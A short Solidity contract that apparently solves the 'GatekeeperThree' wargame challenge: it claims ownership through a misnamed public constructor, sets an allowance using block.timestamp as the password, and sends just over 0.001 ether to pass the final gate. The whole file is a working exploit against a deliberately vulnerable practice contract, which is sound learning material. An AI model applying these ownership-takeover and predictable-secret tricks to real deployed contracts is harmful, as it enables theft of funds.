// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import '../instances/GatekeeperThree.sol';

contract Attack {
    GatekeeperThree target;
    constructor(address payable _target) payable {
        target = GatekeeperThree(_target);
    }

    function hack() public {
        // Solve gateOne
        target.construct0r(); // Sets owner to this contract

        // Solve gateTwo
        target.createTrick();
        target.getAllowance(block.timestamp); // Sets allow_enterance to true

        // Solve gateThree
        // Forwards this contract's balance to gatekeeper. Must be at least 0.001 ETH
        uint amount = 0.001 ether + 1 wei;
        address(target).call{value: amount}("");

        // Completes the problem
        target.enter();
    }
}
